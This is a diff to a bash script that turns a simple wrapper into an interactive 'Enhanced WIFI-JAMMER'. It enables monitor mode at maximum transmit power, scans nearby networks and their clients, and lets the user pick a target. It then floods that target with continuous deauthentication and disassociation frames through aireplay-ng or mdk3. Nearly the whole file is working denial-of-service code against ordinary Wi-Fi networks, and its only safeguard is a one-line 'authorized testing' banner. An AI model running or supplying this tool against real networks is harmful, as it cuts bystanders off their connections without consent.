@@ -1,113 +1,469 @@
 #!/bin/bash
 
-# Check for root privileges
+_version_=1.2
+
+trap cleanup EXIT
+
+# Colors
+RED='\033[1;31m'
+GREEN='\033[1;32m'
+CYAN='\033[0;36m'
+YELLOW='\033[1;33m'
+BLUE='\033[1;34m'
+MAGENTA='\033[1;35m'
+RESET='\033[0m'
+
+# Root check
 if [[ $EUID -ne 0 ]]; then
-   echo "This script must be run as root"
-   exit 1
+  echo -e "${RED}Run as root!${RESET}"
+  exit 1
 fi
 
-# Interface Finder
-interface=$(iw dev | awk '$1=="Interface"{print $2}')
+# Detect interface
+interface=$(iw dev | awk '$1=="Interface"{print $2}' | head -1)
+mon_interface=""
+scan_term_pid=""
 
-# Function to start monitor mode
-start_monitor() {
-    if iwconfig "$interface" | grep "Mode:Monitor" > /dev/null; then
-        echo "Monitor mode is already enabled on $interface"
-    else
-        echo "Enabling monitor mode on $interface..."
-        airmon-ng start "$interface" > /dev/null 2>&1
-        echo "Monitor mode enabled on $interface."
-    fi
+# Cleanup function
+cleanup() {
+  echo -e "\n${YELLOW}🛑 Exiting and disabling monitor mode...${RESET}"
+
+  # Kill scanning terminal if running
+  if [[ -n "$scan_term_pid" ]]; then
+    kill "$scan_term_pid" 2>/dev/null
+    wait "$scan_term_pid" 2>/dev/null
+  fi
+
+  # Stop monitor mode
+  if [[ -n "$mon_interface" ]]; then
+    airmon-ng stop "$mon_interface" > /dev/null 2>&1
+  fi
+
+  # Clean up temporary files
+  rm -f /tmp/scan-01.csv /tmp/bssid_map.txt /tmp/clientscan-01.csv /tmp/clientlist.txt
+
+  # Restart NetworkManager
+  echo -e "${CYAN}[*] Restarting NetworkManager...${RESET}"
+  systemctl restart NetworkManager 2>/dev/null
+
+  # Restore cursor
+  tput cnorm
+  exit 0
 }
 
-# Function to stop monitor mode
-stop_monitor() {
-    if iwconfig "$interface" | grep "Mode:Managed" > /dev/null; then
-        echo "Monitor mode is already disabled on $interface"
-    else
-        interface=$(iw dev | awk '$1=="Interface"{print $2}')
-        echo "Disabling monitor mode on $interface..."
-        airmon-ng stop "$interface" > /dev/null 2>&1
-        echo "Monitor mode disabled on $interface."
-    fi
-}
-
-# Function to show WiFi networks using airodump-ng
-show_networks() {
-    interface=$(iw dev | awk '$1=="Interface"{print $2}')
-    echo "Scanning for WiFi networks on $interface..."
-    airodump-ng "$interface"
-}
-
-show_indivisual_networks() {
-    interface=$(iw dev | awk '$1=="Interface"{print $2}')
-    echo "Scanning for WiFi network on $interface..."
-    airodump-ng "$interface" --bssid "$1" --channel "$2"
-}
-
-perform_attack() {
-    echo "Attack is going to start..."
-    sleep 2
-    echo "To stop attack press Ctrl+c"
-    aireplay-ng "$interface" -0 0 -a "$1" &
-    # Define the loading animation
-    animation="/-\|"
-    index=0
-
-    # Check if aireplay-ng is still running
-    while ps -p $! >/dev/null; do
-        echo -ne "\r[ ${animation:index++%${#animation}:1} ] Running WiFi Jamming Attack..."
-    done
-}
-
-# Check command-line arguments
-case "$1" in
-    --monitor)
-        case "$2" in
-            start)
-                start_monitor
-                ;;
-            stop)
-                stop_monitor
-                ;;
-            *)
-                echo "Unknown argument for -monitor: $2"
-                exit 1
-                ;;
-        esac
-        ;;
-    --status)
-        show_networks
-        ;;
-    --bssid)
-        case "$3" in
-            --channel)
-                    show_indivisual_networks "$2" "$4"
-                    ;;
-        esac
-        ;;
-    --attack)
-        case "$2" in
-            --bssid)
-                    perform_attack "$3"
-                    ;;
-            *)
-                echo "wifi --attack --bssid <bssid_name>"
-                exit 1
-                ;;
-        esac
-        ;;
-    *)
-        echo "Usage: wifi --monitor start"
-        echo "       wifi --monitor stop"
-        echo "       wifi --status"
-        echo "       wifi --bssid <bssid_name> --channel <channel_number>"
-        echo "       wifi --attack --bssid <bssid_name>"
+# Check required tools
+check_tools() {
+  local tools=("airmon-ng" "airodump-ng" "aireplay-ng" "iwconfig" "iw" "mdk3")
+  for tool in "${tools[@]}"; do
+    if ! command -v "$tool" >/dev/null 2>&1; then
+      if [[ "$tool" == "mdk3" ]]; then
+        echo -e "${YELLOW}Warning: mdk3 not found. Some advanced attacks won't be available.${RESET}"
+      else
+        echo -e "${RED}Error: $tool not found. Please install aircrack-ng suite.${RESET}"
         exit 1
-        ;;
-esac
+      fi
+    fi
+  done
+}
 
-# Print the new interface name if it's set
-if [ -n "$new_interface" ]; then
-    echo "New interface name for monitor mode: $new_interface"
-fi
+# Enable monitor mode
+enable_monitor() {
+  if [[ -z "$interface" ]]; then
+    echo -e "${RED}No wireless interface found!${RESET}"
+    exit 1
+  fi
+
+  echo -e "${CYAN}[*] Interface detected: $interface${RESET}"
+
+  if iwconfig "$interface" 2>/dev/null | grep -q "Mode:Monitor"; then
+    mon_interface="$interface"
+    echo -e "${GREEN}[✓] Already in monitor mode: $mon_interface${RESET}"
+  else
+    echo -e "${CYAN}[*] Stopping conflicting processes...${RESET}"
+    # Kill conflicting processes
+    airmon-ng check kill > /dev/null 2>&1
+
+    echo -e "${CYAN}[*] Enabling monitor mode...${RESET}"
+    # Start monitor mode
+    monitor_output=$(airmon-ng start "$interface" 2>&1)
+
+    # Check if monitor interface was created
+    if echo "$monitor_output" | grep -q "monitor mode enabled"; then
+      mon_interface=$(echo "$monitor_output" | grep "monitor mode enabled" | awk '{print $NF}' | tr -d '[]')
+    else
+      mon_interface="${interface}mon"
+    fi
+
+    # Verify monitor mode is working
+    if iwconfig "$mon_interface" 2>/dev/null | grep -q "Mode:Monitor"; then
+      echo -e "${GREEN}[✓] Monitor enabled: $mon_interface${RESET}"
+    else
+      echo -e "${RED}Failed to enable monitor mode!${RESET}"
+      exit 1
+    fi
+  fi
+
+  # Set maximum transmission power
+  echo -e "${CYAN}[*] Setting maximum TX Power...${RESET}"
+  iwconfig "$mon_interface" txpower 30 2>/dev/null || iwconfig "$mon_interface" txpower 20 2>/dev/null
+}
+
+# Scan networks in background
+scan_networks() {
+  echo -e "\n🌐 Select Wi-Fi Band to Scan:\n1) 2.4 GHz\n2) 5 GHz"
+  read -p "Choice (1 or 2): " band_choice
+
+  if [[ "$band_choice" == "1" ]]; then
+    band_filter="bg"
+    band_name="2.4 GHz"
+  elif [[ "$band_choice" == "2" ]]; then
+    band_filter="a"
+    band_name="5 GHz"
+  else
+    echo -e "${RED}Invalid choice. Defaulting to 2.4 GHz${RESET}"
+    band_filter="bg"
+    band_name="2.4 GHz"
+  fi
+
+  echo -e "[*] Opening airodump-ng for ${CYAN}${band_name}${RESET} band..."
+
+  # Remove old scan files
+  rm -f /tmp/scan-01.csv /tmp/scan-01.cap /tmp/scan-01.kismet.csv /tmp/scan-01.kismet.netxml
+
+  # Start scanning in background with proper command formatting
+  if command -v xterm >/dev/null 2>&1; then
+    xterm -title "WiFi Scanner - ${band_name}" -e "airodump-ng --band ${band_filter} --write /tmp/scan --output-format csv ${mon_interface}" &
+    scan_term_pid=$!
+  else
+    # Fallback to gnome-terminal if xterm not available
+    if command -v gnome-terminal >/dev/null 2>&1; then
+      gnome-terminal --title="WiFi Scanner - ${band_name}" -- bash -c "airodump-ng --band ${band_filter} --write /tmp/scan --output-format csv ${mon_interface}" &
+      scan_term_pid=$!
+    else
+      echo -e "${RED}No terminal emulator (xterm/gnome-terminal) found!${RESET}"
+      exit 1
+    fi
+  fi
+
+  echo -e "\n${YELLOW}▶ Let the scan run for at least 15-20 seconds, then press Enter to continue.${RESET}"
+  read -p "Press Enter to continue..."
+
+  # Give a moment for the scan to write data
+  sleep 2
+
+  # Restore cursor
+  tput cnorm
+}
+
+# List APs with security info
+list_aps() {
+  if [[ ! -f "/tmp/scan-01.csv" ]]; then
+    echo -e "${RED}Scan file not found! Make sure the scan ran properly.${RESET}"
+    exit 1
+  fi
+
+  echo -e "\n📡 Available Networks:\n"
+
+  # Enhanced AP listing with security information
+  awk -F, '
+    BEGIN {
+      i=1
+      print "Index|BSSID|Signal|Channel|Security|ESSID" > "/tmp/bssid_map.txt"
+    }
+    /^BSSID/ {
+      header_found=1
+      next
+    }
+    /^Station/ {
+      header_found=0
+    }
+    header_found && $1 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/ {
+      bssid = $1
+      signal = $9
+      channel = $4
+      privacy = $6
+      cipher = $7
+      auth = $8
+      essid = ""
+
+      # Extract ESSID (everything from field 14 onwards)
+      for (j=14; j<=NF; j++) {
+        if (j > 14) essid = essid " "
+        essid = essid $j
+      }
+
+      # Clean up ESSID
+      gsub(/^[ \t]+|[ \t]+$/, "", essid)
+      if (essid == "" || essid == " ") essid = "<Hidden>"
+
+      # Determine security type
+      security = "OPN"
+      if (privacy ~ /WPA3/) security = "WPA3"
+      else if (privacy ~ /WPA2/) security = "WPA2"
+      else if (privacy ~ /WPA/) security = "WPA"
+      else if (privacy ~ /WEP/) security = "WEP"
+
+      if (auth ~ /PSK/ && cipher ~ /CCMP/) security = security " [AES]"
+      else if (auth ~ /PSK/ && cipher ~ /TKIP/) security = security " [TKIP]"
+      if (privacy ~ /MGT/) security = security " [PMF]"
+
+      # Color coding based on security
+      if (security == "OPN") color_code = "91"  # Red
+      else if (security ~ /WEP/) color_code = "93" # Yellow
+      else if (security ~ /WPA[^23]/) color_code = "94" # Blue
+      else if (security ~ /WPA2/) color_code = "92" # Green
+      else if (security ~ /WPA3/) color_code = "96" # Cyan
+      else color_code = "97" # White
+
+      # Print formatted output with colors
+      printf "[%d] \033[%sm%s\033[0m | %s dBm | CH %s | %s\n", i, color_code, bssid, signal, channel, essid
+
+      # Store mapping
+      printf "%d|%s|%s|%s|%s|%s\n", i, bssid, signal, channel, security, essid >> "/tmp/bssid_map.txt"
+      i++
+    }
+  ' /tmp/scan-01.csv
+
+  # Check if any networks were found
+  if [[ ! -s "/tmp/bssid_map.txt" ]] || [[ $(wc -l < "/tmp/bssid_map.txt") -le 1 ]]; then
+    echo -e "${RED}No networks found! Make sure the scan is running and try again.${RESET}"
+    exit 1
+  fi
+}
+
+# Select Target with security analysis
+select_target() {
+  local max_num=$(( $(wc -l < "/tmp/bssid_map.txt") - 1 ))
+
+  if [[ $max_num -le 0 ]]; then
+    echo -e "${RED}No valid targets available!${RESET}"
+    exit 1
+  fi
+
+  echo -ne "\nSelect target number (1-${max_num}): "
+  read num
+
+  # Validate input
+  if ! [[ "$num" =~ ^[0-9]+$ ]] || [[ "$num" -lt 1 ]] || [[ "$num" -gt "$max_num" ]]; then
+    echo -e "${RED}❌ Invalid selection. Please enter a number between 1 and ${max_num}.${RESET}"
+    exit 1
+  fi
+
+  # Get target info from mapping file
+  target_line=$(sed -n "$((num + 1))p" /tmp/bssid_map.txt)
+  bssid=$(echo "$target_line" | cut -d'|' -f2)
+  channel=$(echo "$target_line" | cut -d'|' -f4)
+  security=$(echo "$target_line" | cut -d'|' -f5)
+  essid=$(echo "$target_line" | cut -d'|' -f6)
+
+  if [[ -z "$bssid" || -z "$channel" ]]; then
+    echo -e "${RED}❌ Invalid selection or corrupted data.${RESET}"
+    exit 1
+  fi
+
+  echo -e "[*] Target selected: ${CYAN}$essid${RESET} (${CYAN}$bssid${RESET}) on channel ${CYAN}$channel${RESET}"
+  echo -e "[*] Security: ${YELLOW}$security${RESET}"
+
+  # Warn about protected management frames
+  if [[ "$security" =~ "PMF" ]]; then
+    echo -e "${YELLOW}⚠ Warning: Target uses Protected Management Frames (PMF). Deauth attacks may be less effective.${RESET}"
+  fi
+}
+
+# Enhanced client scanning
+show_clients() {
+  echo -e "\n🔍 Scanning for connected clients on ${CYAN}$essid${RESET}..."
+  echo -e "${YELLOW}Press Ctrl+C in the scanning window to stop client discovery.${RESET}"
+
+  # Remove old client scan files
+  rm -f /tmp/clientscan-01.csv /tmp/clientscan-01.cap /tmp/clientscan-01.kismet.csv /tmp/clientscan-01.kismet.netxml
+
+  # Clean channel value and set it
+  channel=$(echo "$channel" | tr -d ' ')
+  echo -e "${CYAN}[*] Setting channel to $channel...${RESET}"
+  iwconfig "$mon_interface" channel "$channel"
+  sleep 1
+
+  # Verify channel is set
+  current_freq=$(iwconfig "$mon_interface" 2>/dev/null | grep "Frequency" | awk '{print $2}')
+  echo -e "${GREEN}[✓] Channel set. Current frequency: $current_freq${RESET}"
+
+  # Start client scanning with proper command formatting
+  if command -v xterm >/dev/null 2>&1; then
+    xterm -title "Client Scanner - $essid" -hold -e "airodump-ng --bssid $bssid --channel $channel --write /tmp/clientscan --output-format csv $mon_interface" &
+    local client_scan_pid=$!
+    wait $client_scan_pid 2>/dev/null
+  else
+    if command -v gnome-terminal >/dev/null 2>&1; then
+      gnome-terminal --title="Client Scanner - $essid" --wait -- bash -c "airodump-ng --bssid $bssid --channel $channel --write /tmp/clientscan --output-format csv $mon_interface"
+    else
+      echo -e "${YELLOW}Running client scan in current terminal. Press Ctrl+C to stop.${RESET}"
+      timeout 30 airodump-ng --bssid "$bssid" --channel "$channel" --write /tmp/clientscan --output-format csv "$mon_interface" || true
+    fi
+  fi
+
+  # Wait a moment for file to be written
+  sleep 1
+
+  # Process client data if file exists
+  if [[ -f "/tmp/clientscan-01.csv" ]]; then
+    echo -e "\n📱 Detected Clients:"
+
+    # Extract client MAC addresses with signal strength
+    awk -F, '
+      /^Station/ { station_section=1; next }
+      station_section && $1 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/ && $1 != "" {
+        gsub(/^[ \t]+|[ \t]+$/, "", $1)
+        gsub(/^[ \t]+|[ \t]+$/, "", $4)
+        if ($1 != "") {
+          printf "%d) %s (Power: %s dBm)\n", ++i, $1, $4
+        }
+      }
+    ' /tmp/clientscan-01.csv > /tmp/clientlist.txt
+
+    if [[ -s "/tmp/clientlist.txt" ]]; then
+      cat /tmp/clientlist.txt
+      echo ""
+      read -p "Select client number to target (or press Enter to target all clients): " client_num
+
+      if [[ -n "$client_num" ]] && [[ "$client_num" =~ ^[0-9]+$ ]]; then
+        client_mac=$(sed -n "${client_num}p" /tmp/clientlist.txt | awk '{print $2}')
+        if [[ -n "$client_mac" ]]; then
+          echo -e "[*] Selected client: ${CYAN}$client_mac${RESET}"
+        else
+          echo -e "${YELLOW}Invalid client selection. Will target all clients.${RESET}"
+          client_mac=""
+        fi
+      else
+        echo -e "[*] No specific client selected. Will target all clients."
+        client_mac=""
+      fi
+    else
+      echo -e "${YELLOW}No clients detected. Attack will target the AP directly.${RESET}"
+      client_mac=""
+    fi
+  else
+    echo -e "${YELLOW}Client scan file not found. Attack will target the AP directly.${RESET}"
+    client_mac=""
+  fi
+}
+
+# Enhanced attack menu
+attack_menu() {
+  echo -e "\n🎯 Select Attack Method:"
+  echo -e "1) ${RED}Standard Deauth${RESET} - Continuous deauth frames"
+  echo -e "2) ${MAGENTA}Mixed Attack${RESET} - Deauth + disassociation"
+  echo -e "3) ${BLUE}MDK3 Attack${RESET} - Advanced deauth with mdk3 𓆩😈𓆪 (if available)"
+  echo -e "4) ${CYAN}Coming Soon${RESET}..."
+
+  read -p "Choice (1-5): " attack_choice
+
+  case $attack_choice in
+    1) attack_type="standard" ;;
+    2) attack_type="mixed" ;;
+    3) attack_type="mdk3" ;;
+    *)
+      echo -e "${YELLOW}Invalid choice. Using standard attack.${RESET}"
+      attack_type="standard"
+      ;;
+  esac
+
+  echo -ne "\n${YELLOW}⚠ Do you want to launch attack on $essid ($bssid)? (y/n): ${RESET}"
+  read confirm
+  if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
+    echo -e "${CYAN}Aborting attack.${RESET}"
+    exit 0
+  fi
+}
+
+# Enhanced deauth attack with multiple methods
+jam_attack() {
+  echo -e "\n[*] Setting channel to $channel..."
+  # Clean channel value and set it
+  clean_channel=$(echo "$channel" | tr -d ' ')
+  iwconfig "$mon_interface" channel "$clean_channel"
+  sleep 2
+
+  # Verify channel
+  current_freq=$(iwconfig "$mon_interface" 2>/dev/null | grep "Frequency")
+  echo -e "${GREEN}[✓] Channel set. $current_freq${RESET}"
+
+  echo -e "${RED}[⚔] Starting $attack_type attack... Press Ctrl+C to stop.${RESET}"
+  echo -e "${YELLOW}Target: $essid ($bssid) on channel $clean_channel${RESET}"
+
+  if [[ -n "$client_mac" ]]; then
+    echo -e "${YELLOW}Targeting specific client: $client_mac${RESET}"
+  else
+    echo -e "${YELLOW}Mode: Broadcast (targeting all clients)${RESET}"
+  fi
+
+  case $attack_type in
+    "standard")
+      if [[ -n "$client_mac" ]]; then
+        aireplay-ng --deauth 0 -a "$bssid" -c "$client_mac" "$mon_interface"
+      else
+        aireplay-ng --deauth 0 -a "$bssid" "$mon_interface"
+      fi
+      ;;
+
+    "mixed")
+      echo -e "${CYAN}[*] Using mixed deauth/disassoc attack${RESET}"
+      while true; do
+        if [[ -n "$client_mac" ]]; then
+          # Deauth attack
+          timeout 3 aireplay-ng --deauth 20 -a "$bssid" -c "$client_mac" "$mon_interface" &
+          # Disassociation attack
+          timeout 3 aireplay-ng --disassoc 20 -a "$bssid" -c "$client_mac" "$mon_interface" &
+        else
+          timeout 3 aireplay-ng --deauth 20 -a "$bssid" "$mon_interface" &
+          timeout 3 aireplay-ng --disassoc 20 -a "$bssid" "$mon_interface" &
+        fi
+        wait
+        sleep 1
+      done
+      ;;
+
+    "mdk3")
+      if command -v mdk3 >/dev/null 2>&1; then
+        echo -e "${CYAN}[*] Using MDK3 for advanced deauth${RESET}"
+        echo "$bssid" > /tmp/target_ap.txt
+        mdk3 "$mon_interface" d -b /tmp/target_ap.txt -c "$clean_channel"
+      else
+        echo -e "${RED}MDK3 not available. Falling back to standard attack.${RESET}"
+        if [[ -n "$client_mac" ]]; then
+          aireplay-ng --deauth 0 -a "$bssid" -c "$client_mac" "$mon_interface"
+        else
+          aireplay-ng --deauth 0 -a "$bssid" "$mon_interface"
+        fi
+      fi
+      ;;
+  esac
+}
+
+# Main execution flow
+main() {
+  clear
+  echo -e "${CYAN}Enhanced WIFI-JAMMER v$_version_ ${RESET}"
+  echo -e "${YELLOW}For educational and authorized testing purposes only!${RESET}"
+  echo ""
+
+  check_tools
+  enable_monitor
+  scan_networks
+  list_aps
+  select_target
+  show_clients
+  attack_menu
+  jam_attack
+}
+
+# Global variables
+bssid=""
+channel=""
+essid=""
+client_mac=""
+security=""
+attack_type=""
+
+# Run main function
+main
